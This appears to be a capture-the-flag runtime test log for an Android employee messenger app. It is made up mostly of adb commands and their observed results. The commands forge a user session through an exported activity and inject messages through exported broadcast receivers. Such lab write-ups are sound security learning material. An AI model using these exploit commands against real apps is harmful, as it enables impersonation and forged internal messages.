# Mag1k Runtime Tests

All commands below were executed against the Android emulator. The shell location does not matter, but the recommended clean starting point is:

```bash
cd ~
```

## 1. Exported activity session forgery

Command:

```bash
adb shell 'am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"'
```

Observed:
- Messenger opens as `Alexandros Charalampidis`
- no password is required

## 2. Cold-start explicit receiver injection

Command:

```bash
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.AUTH_SEND_MESSAGE --es TO "<recipient>" --es Message "coldstart_auth_probe" --es username "<redacted>" --es password "<redacted>"'
```

Follow-up:

```bash
adb shell 'am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Christos Markatos"'
```

Validation command:

```bash
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.AUTH_SEND_MESSAGE --es TO "<recipient>" --es Message "coldstart_auth_probe" --es username "<redacted>" --es password "<redacted>"; sleep 1; am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "<redacted-user>"; sleep 2; input tap 500 870; sleep 2; uiautomator dump /sdcard/mag1k_coldstart.xml >/dev/null 2>&1; grep -o coldstart_auth_probe /sdcard/mag1k_coldstart.xml | wc -l'
```

Observed:
- output count: `1`
- proves cold-start message injection through the exported receiver

## 3. Unauthenticated explicit SEND_MESSAGE

Validation command:

```bash
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_MESSAGE --es TO "Petros Papadopoulos" --es Message "unauth_probe" --es login_user "Alexandros Charalampidis"; sleep 1; am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"; sleep 2; input tap 500 870; sleep 2; uiautomator dump /sdcard/mag1k_unauth.xml >/dev/null 2>&1; grep -o unauth_probe /sdcard/mag1k_unauth.xml | wc -l'
```

Observed:
- output count: `0`
- proves `SEND_MESSAGE` alone needs session state

## 4. Forged session plus explicit SEND_MESSAGE

Validation command:

```bash
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "Alexandros Charalampidis"; sleep 2; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_MESSAGE --es TO "Petros Papadopoulos" --es Message "explicit_send_probe" --es login_user "Alexandros Charalampidis"; sleep 1; input tap 500 870; sleep 2; uiautomator dump /sdcard/mag1k_explicit_send.xml >/dev/null 2>&1; grep -o explicit_send_probe /sdcard/mag1k_explicit_send.xml | wc -l'
```

Observed:
- output count: `1`
- proves session forgery plus explicit receiver abuse yields visible internal message injection

## 5. SEND_PROJECT behavior

Validation command:

```bash
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am broadcast -n com.blindsec.internalemployeemessenger/.ActionReceiver -a com.blindsec.SEND_PROJECT --es TO "<recipient>" --es Message "project_probe" --es username "<redacted>" --es password "<redacted>" --es project "MessengerExploit"; sleep 1; am start -n com.blindsec.internalemployeemessenger/.MessengerActivity --es login_user "<redacted-user>"; sleep 2; input tap 500 870; sleep 2; uiautomator dump /sdcard/mag1k_project.xml >/dev/null 2>&1; grep -o project_probe /sdcard/mag1k_project.xml | wc -l'
```

Observed:
- output count: `0`
- `SEND_PROJECT` is not implemented in `ActionReceiver.java`

## 6. Dynamic receiver registration in LoginActivity

Command:

```bash
adb shell 'am force-stop com.blindsec.internalemployeemessenger; am start -n com.blindsec.internalemployeemessenger/.ui.login.LoginActivity; sleep 1; dumpsys activity broadcasts | sed -n "/Registered Receivers:/,/Receiver Resolver Table:/p" | sed -n "/com.blindsec.internalemployeemessenger/,/ReceiverList/p"'
```

Observed:
- registered filters for:
  - `com.blindsec.SEND_MESSAGE`
  - `com.blindsec.SEND_PROJECT`
  - `com.blindsec.AUTH_SEND_MESSAGE`
  - hidden listener action

## Conclusion from runtime

Most likely solve type:
- malicious helper-app / phone-based cross-app exploit

Strongest proven impact:
- forge employee session with exported `MessengerActivity`
- or use explicit `AUTH_SEND_MESSAGE` cold-start path
- inject visible internal messages through exported `ActionReceiver`

No new literal `Mag1k` flag was surfaced by these runtime tests.
